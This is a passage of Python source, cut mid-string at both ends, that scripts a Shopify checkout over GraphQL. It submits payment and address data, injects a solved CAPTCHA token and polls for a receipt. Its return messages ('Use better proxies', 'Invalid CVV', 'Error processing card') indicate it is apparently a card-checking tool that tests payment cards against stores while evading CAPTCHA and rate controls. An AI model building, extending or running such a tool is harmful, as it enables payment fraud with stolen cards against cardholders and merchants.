PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}',
                'variables': {
                    'input': {
                        'sessionInput': {
                            'sessionToken': sst,
                        },
                        'queueToken': queueToken,
                        'discounts': {
                            'lines': [],
                            'acceptUnexpectedDiscounts': True,
                        },
                        'delivery': {
                            'deliveryLines': [
                                {
                                    'destination': {
                                        'streetAddress': {
                                        'address1': street,
                                        'address2': address2,
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': s_zip,
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'zoneCode': state,
                                        'phone': phone,
                                        },
                                    },
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyByHandle': {
                                            'handle': delivery_strategy,
                                            'customDeliveryRate': False,
                                        },
                                        'options': {
                                            'phone': phone,
                                        },
                                    },
                                    'targetMerchandiseLines': {
                                        'lines': [
                                            {
                                                'stableId': stableId,
                                            },
                                        ],
                                    },
                                    'deliveryMethodTypes': [
                                        'SHIPPING',
                                    ],
                                    'expectedTotalPrice': {
                                        'value': {
                                            'amount': shipping_amount,
                                            'currencyCode': currency
                                        },
                                    },
                                    'destinationChanged': False,
                                },
                            ],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': True,
                            'prefetchShippingRatesStrategy': None,
                            'supportsSplitShipping': True,
                        },
                        'deliveryExpectations': {
                            'deliveryExpectationLines': [],
                        },
                        'merchandise': {
                            'merchandiseLines': [
                                {
                                    'stableId': stableId,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {
                                        'items': {
                                            'value': 1,
                                        },
                                    },
                                    'expectedTotalPrice': {
                                        'value': {
                                            'amount': subtotal,
                                            'currencyCode': currency,
                                        },
                                    },
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                },
                            ],
                        },
                        'payment': {
                            'totalAmount': {
                                'any': True,
                            },
                            'paymentLines': [
                                {
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': paymentmethodidentifier,
                                            'sessionId': payment_token,
                                            'billingAddress': {
                                                'streetAddress': {
                                        'address1': street,
                                        'address2': address2,
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': s_zip,
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'zoneCode': state,
                                        'phone': phone,
                                        },
                                            },
                                            'cardSource': None,
                                        },
                                        'giftCardPaymentMethod': None,
                                        'redeemablePaymentMethod': None,
                                        'walletPaymentMethod': None,
                                        'walletsPlatformPaymentMethod': None,
                                        'localPaymentMethod': None,
                                        'paymentOnDeliveryMethod': None,
                                        'paymentOnDeliveryMethod2': None,
                                        'manualPaymentMethod': None,
                                        'customPaymentMethod': None,
                                        'offsitePaymentMethod': None,
                                        'customOnsitePaymentMethod': None,
                                        'deferredPaymentMethod': None,
                                        'customerCreditCardPaymentMethod': None,
                                        'paypalBillingAgreementPaymentMethod': None,
                                    },
                                    'amount': {
                                        'value': {
                                            'amount': running_total,
                                            'currencyCode': currency
                                        },
                                    },
                                    'dueAt': None,
                                },
                            ],
                            'billingAddress':  {
                                'streetAddress': {
                                        'address1': street,
                                        'address2': address2,
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': s_zip,
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'zoneCode': state,
                                        'phone': phone,
                                        },
                            },
                        },
                        'buyerIdentity': {
                            'customer': {
                                'presentmentCurrency': currency,
                                'countryCode': 'US',
                            },
                            'email': email,
                            'emailChanged': False,
                            'phoneCountryCode': 'US',
                            'marketingConsent': [
                                {
                                    'email': {
                                        'value': email,
                                    },
                                },
                            ],
                            'shopPayOptInPhone': {
                                'number': phone,
                                'countryCode': 'US',
                            },
                            'rememberMe': False,
                        },
                        'tip': {
                            'tipLines': [],
                        },
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {
                                'value': {
                                    'amount': tax_amount,
                                    'currencyCode': currency,
                                },
                            },
                            'proposedTotalIncludedAmount': None,
                            'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': [],
                        },
                        'note': {
                            'message': None,
                            'customAttributes': [],
                        },
                        'localizationExtension': {
                            'fields': [],
                        },
                        'nonNegotiableTerms': None,
                        'scriptFingerprint': {
                            'signature': None,
                            'signatureUuid': None,
                            'lineItemScriptChanges': [],
                            'paymentScriptChanges': [],
                            'shippingScriptChanges': [],
                        },
                        'optionalDuties': {
                            'buyerRefusesDuties': False,
                        },
                    },
                    'attemptToken': checkout_url.split('/')[-1],
                    'metafields': [],
                    'analytics': {
                        'requestUrl': checkout_url,
                    },
                },
                'operationName': 'SubmitForCompletion',
            }
            
            # Add CAPTCHA token to completion_json if we have one - FINAL FIXED VERSION
            if hasattr(self, 'captcha_token') and self.captcha_token:
                completion_json['variables']['input']['captcha'] = {
                    'provider': self.captcha_type.upper() if hasattr(self, 'captcha_type') else 'HCAPTCHA',
                    'token': self.captcha_token,
                    'challenge': '',  # Empty string instead of null
                }
            
            resp = await self.session.post(graphql_url, json=completion_json, headers=headers)
            text = await resp.text()
            
            if "Your order total has changed." in text:
                return False, "Site not supported - Total changed", {}
            
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", {}
            
            try:
                resp_json = await resp.json()
                receipt_id = resp_json['data']['submitForCompletion']['receipt']['id']
                print(f"[+] Receipt ID: {receipt_id}")
            except:
                if 'CAPTCHA_METADATA_MISSING' in text:
                    return False, "Captcha required - Use better proxies", {}
                
                await asyncio.sleep(5)
                resp = await self.session.post(graphql_url, json=completion_json, headers=headers)
                text = await resp.text()
                
                try:
                    resp_json = await resp.json()
                    receipt_id = resp_json['data']['submitForCompletion']['receipt']['id']
                except:
                    if 'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE' in text:
                        return False, "Invalid CVV", {}
                    return False, "Error processing card", {}
            
            # STEP 4: POLL FOR RECEIPT
            print(f"[*] Polling for receipt...")
            await asyncio.sleep(5)
            
            poll_json = {
                'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename 